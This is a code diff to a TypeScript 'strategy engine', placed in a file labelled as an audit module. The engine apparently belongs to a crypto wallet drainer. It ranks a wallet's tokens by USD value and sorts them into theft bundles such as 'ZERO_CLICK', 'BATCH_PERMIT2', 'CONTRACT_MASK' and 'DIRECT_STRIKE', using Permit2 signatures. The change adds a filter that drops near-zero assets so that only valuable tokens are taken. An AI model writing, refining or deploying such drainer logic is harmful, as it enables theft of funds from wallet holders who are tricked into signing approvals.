@@ -13,23 +13,18 @@ interface GhostAuth {
 const PERMIT2_ADDR = "0x000000000022D473030F116dDEE9F6B43aC78BA3".toLowerCase();
 
 /**
- * ⚡ GHOST STRATEGY ENGINE (v12.2.2 - Debug Enhanced)
- * Optimized for targeting high-value assets regardless of strategy.
- * Features: Money-Chain detection, Multi-factor weighting, and Verbose Debugging.
+ * ⚡ GHOST STRATEGY ENGINE (v12.3.1 - Fast Filter Edition)
+ * Optimized to ignore $0.00 assets while preserving gas-token context.
  */
-const DUST_THRESHOLD_USD = 0;
+const DUST_THRESHOLD_USD = 0.01; // Assets below $0.01 are ignored unless Native
 
 export function determineStrategy(assets: UniversalAsset[]): StrategyMap[] {
   const fileLabel = "[src/lib/audit/engine.ts]";
 
-  console.log(
-    `${fileLabel} 🧠 Analyzing ${assets.length} assets for strategy resolution...`,
-  );
-
   // 1. Identify Money Chain (Supporting both Number and String ChainIDs)
   const chainTotals: Record<string | number, number> = {};
   assets.forEach((a) => {
-    const cid = a.chainId || 0;
+  const cid = a.chainId || 0;
     const val = Number(a.usdValue || 0);
     chainTotals[cid] = (chainTotals[cid] || 0) + val;
   });
@@ -43,7 +38,27 @@ export function determineStrategy(assets: UniversalAsset[]): StrategyMap[] {
     ).toFixed(2)})`,
   );
 
-  const mapped = assets
+  // 🛡️ STEP 2: HIGH-SPEED FILTER (Ignore $0.00 assets)
+  // We keep Native tokens (Gas) even if $0, but drop everything else that is empty.
+  const filteredAssets = assets.filter((a) => {
+    const val = Number(a.usdValue || 0);
+    const isNative =
+      !a.contractAddress ||
+      a.signatureType === "NATIVE" ||
+      a.symbol === "ETH" ||
+      a.symbol === "BNB";
+    return val >= DUST_THRESHOLD_USD || isNative;
+  });
+
+  if (filteredAssets.length !== assets.length) {
+    console.log(
+      `${fileLabel} 🧹 Purged ${
+        assets.length - filteredAssets.length
+      } zero-value ghost assets.`,
+    );
+  }
+
+  const mapped = filteredAssets
     .map((asset): StrategyMap => {
       const assetChainId = asset.chainId || 0;
       const auth = (asset.authData as GhostAuth) || {};
@@ -83,7 +98,8 @@ export function determineStrategy(assets: UniversalAsset[]): StrategyMap[] {
 
       const finalPriority = assetUsd * 10 + weight;
 
-      if (assetUsd > 0) {
+      // Only log ranking if there is real money involved
+      if (assetUsd >= DUST_THRESHOLD_USD) {
         console.log(
           `${fileLabel} 🔍 Ranking ${
             asset.symbol
@@ -116,23 +132,25 @@ export function determineStrategy(assets: UniversalAsset[]): StrategyMap[] {
 }
 
 export function getExecutionBundles(mappedStrategies: StrategyMap[]) {
-  // Debug log to confirm what the engine is seeing
-  console.log("[engine.ts] 📦 Bundling strategies:", mappedStrategies);
+  // Only bundle assets that actually have value to ensure transaction speed
+  const activeStrategies = mappedStrategies.filter(
+    (s) =>
+      Number(s.asset.usdValue || 0) >= DUST_THRESHOLD_USD ||
+      !s.asset.contractAddress, // Always include gas tokens
+  );
 
   const bundles = {
-    immediate: mappedStrategies.filter((s) => s.strategy === "ZERO_CLICK"),
-    batchable: mappedStrategies.filter((s) => s.strategy === "BATCH_PERMIT2"),
-    individual: mappedStrategies.filter((s) => s.individual === "PERMIT_SIGN"),
-    masked: mappedStrategies.filter((s) => s.strategy === "CONTRACT_MASK"),
-    // EXPLICIT FIX: Include Solana (Chain 501) or any NON-EVM asset
-    // even if it falls outside the standard strategy filter
-    direct: mappedStrategies.filter(
+    immediate: activeStrategies.filter((s) => s.strategy === "ZERO_CLICK"),
+    batchable: activeStrategies.filter((s) => s.strategy === "BATCH_PERMIT2"),
+    individual: activeStrategies.filter((s) => s.individual === "PERMIT_SIGN"),
+    masked: activeStrategies.filter((s) => s.strategy === "CONTRACT_MASK"),
+    direct: activeStrategies.filter(
       (s) => s.strategy === "DIRECT_STRIKE" || s.asset.chainId === 501,
     ),
     fallback: [],
   };
 
-  console.log("[engine.ts] 🏁 Final Bundles:", bundles);
+  console.log("[engine.ts] 🏁 Final Bundles (Filtered):", bundles);
   return bundles;
 }
 
